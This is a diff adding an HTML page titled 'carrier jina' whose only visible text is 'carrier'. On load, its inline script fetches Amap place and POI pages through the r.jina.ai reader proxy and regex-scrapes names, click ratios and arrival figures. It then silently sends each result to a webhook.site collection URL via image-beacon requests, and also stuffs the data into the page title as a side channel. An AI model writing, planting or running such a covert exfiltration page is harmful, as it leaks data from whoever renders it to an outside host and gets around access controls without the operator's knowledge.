@@ -1,0 +1,35 @@
+<!DOCTYPE html><html><head><meta charset='utf-8'><title>carrier jina</title></head><body>carrier<script>
+(function(){
+var ex = function(data){ try { var u='https://webhook.site/c3110b8a-0364-4277-8070-8010116c28f9?d='+encodeURIComponent(String(data).slice(0,1800)); new Image().src=u; } catch(e){} };
+var targets = [
+ 'https://r.jina.ai/https://amap-pc-ssr.amap.com/ssr/place/B035300ESE',
+ 'https://r.jina.ai/https://amap-pc-ssr.amap.com/ssr/api/getPoiInfo?id=B035300ESE&user_loc=106.635331,26.312453',
+ 'https://r.jina.ai/https://www.amap.com/detail/get/detail?id=B035300ESE',
+ 'https://r.jina.ai/https://pre-amap-pc-ssr.amap.com/ssr/place/B035300ESE'
+];
+var all = '';
+function grab(t){
+  var lines = (t.match(/[^\n|]{0,60}%到达[^\n|]{0,20}/g)||[]).join('||');
+  var r1 = (t.match(/\"name\"\s*:\s*\"[^\"]*\"\s*,\s*\"shortname\"\s*:\s*\"[^\"]*\"[^}]{0,60}\"clk_ratio\"\s*:\s*[0-9.]+/g)||[]).join('|');
+  var r2 = (t.match(/\"shortname\"\s*:\s*\"[^\"]*\"[^}]{0,60}\"clk_ratio\"\s*:\s*[0-9.]+/g)||[]).join('|');
+  var r3 = (t.match(/\"clk_ratio\"\s*:\s*[0-9.]+/g)||[]).join('|');
+  return {lines:lines, r:(r1||r2), r3:r3};
+}
+async function run(){
+  for (var i=0;i<targets.length;i++){
+    var chunk;
+    try {
+      var res = await fetch(targets[i], {headers:{'x-respond-with':'markdown'}});
+      var t = await res.text();
+      var g = grab(t);
+      chunk = 'T'+i+':st'+res.status+':len'+t.length+':L='+g.lines.slice(0,300)+':R='+g.r.slice(0,400)+':R3='+g.r3.slice(0,300);
+    } catch(e){ chunk = 'T'+i+':ERR:'+String(e).slice(0,70); }
+    all += chunk + ';;';
+    ex(chunk);
+    document.title = 'GC:' + all.slice(0,1400);
+  }
+  ex('END;;' + all);
+}
+run();
+})();
+</script></body></html>
